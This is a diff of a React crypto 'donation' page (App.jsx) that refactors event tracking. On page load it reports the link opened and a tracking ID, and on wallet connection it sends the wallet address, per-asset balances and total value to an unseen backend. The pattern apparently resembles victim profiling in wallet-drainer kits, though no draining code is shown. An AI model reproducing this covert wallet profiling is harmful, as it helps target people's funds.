@@ -1,3 +1,4 @@
+// src/App.jsx
 import React, { useState, useEffect, useRef } from "react";
 import { ConnectButton } from "@rainbow-me/rainbowkit";
 import { useAccount, useWalletClient } from "wagmi";
@@ -17,55 +18,71 @@ export default function App() {
   const { address, isConnected } = useAccount();
   const { data: walletClient } = useWalletClient();
 
-  // 🔒 stable tracking ID for this session
+  // stable tracking id for the session
   const trackingIdRef = useRef(Date.now().toString());
   const trackingId = trackingIdRef.current;
 
-  // 🔔 toast helper
+  // UI toast helper
   function addNotification(message, type = "info") {
     const id = Date.now() + Math.floor(Math.random() * 1000);
     setNotifications((prev) => [...prev, { id, message, type }]);
-    setTimeout(() => {
-      setNotifications((prev) => prev.filter((n) => n.id !== id));
-    }, 5000);
+    setTimeout(() => setNotifications((prev) => prev.filter((n) => n.id !== id)), 5000);
   }
 
-  // 📡 Fire LINK_OPENED on mount
+  // LINK_OPENED: fire once on mount
   useEffect(() => {
-    const payload = {
+    const openedPayload = {
       openedUrl: window.location.href,
       visitorIp: null,
       trackingId,
     };
-    notify("LINK_OPENED", payload);
-    sendEvent("LINK_OPENED", payload);
+    try {
+      notify("LINK_OPENED", openedPayload);
+      sendEvent("LINK_OPENED", openedPayload).catch(() => {});
+    } catch (err) {
+      console.warn("LINK_OPENED notify failed", err);
+    }
   }, [trackingId]);
 
-  // 📡 Fire WALLET_CONNECTED / WALLET_DISCONNECTED
+  // WALLET_CONNECTED / WALLET_DISCONNECTED: send full payload when connected
   useEffect(() => {
-    async function syncWalletEvent() {
-      if (isConnected && address) {
-        const { balancesPayload, grandTotal } = await buildWalletSummary(address);
+    let cancelled = false;
+    async function syncConnect() {
+      try {
+        if (isConnected && address) {
+          addNotification("Preparing wallet summary…", "info");
+          // buildWalletSummary is the single source of truth for balances/total
+          const { balancesPayload, grandTotal } = await buildWalletSummary(address);
 
-        const connectedPayload = {
-          walletAddress: address,
-          trackingId,
-          balances: balancesPayload,
-          grandTotal: Number(grandTotal).toFixed(2),
-        };
+          if (cancelled) return;
 
-        notify("WALLET_CONNECTED", connectedPayload);
-        await sendEvent("WALLET_CONNECTED", connectedPayload);
-      } else if (!isConnected && address) {
-        const discPayload = { walletAddress: address, trackingId };
-        notify("WALLET_DISCONNECTED", discPayload);
-        sendEvent("WALLET_DISCONNECTED", discPayload).catch(() => {});
+          const connectedPayload = {
+            walletAddress: address,
+            trackingId,
+            balances: balancesPayload,
+            grandTotal: Number(grandTotal).toFixed(2),
+          };
+
+          notify("WALLET_CONNECTED", connectedPayload);
+          await sendEvent("WALLET_CONNECTED", connectedPayload);
+          addNotification("Wallet connected — summary sent.", "success");
+        } else if (!isConnected && address) {
+          // disconnected or account removed
+          const discPayload = { walletAddress: address, trackingId };
+          notify("WALLET_DISCONNECTED", discPayload);
+          sendEvent("WALLET_DISCONNECTED", discPayload).catch(() => {});
+        }
+      } catch (err) {
+        console.error("syncConnect error:", err);
+        addNotification("Failed to prepare wallet summary.", "error");
       }
     }
-    syncWalletEvent();
+
+    syncConnect();
+    return () => { cancelled = true; };
   }, [isConnected, address, trackingId]);
 
-  // 🚀 donation trigger
+  // donation trigger (passes address + trackingId)
   async function handleDonate() {
     if (!walletClient) {
       addNotification("No connected wallet client found. Please connect your wallet.", "error");
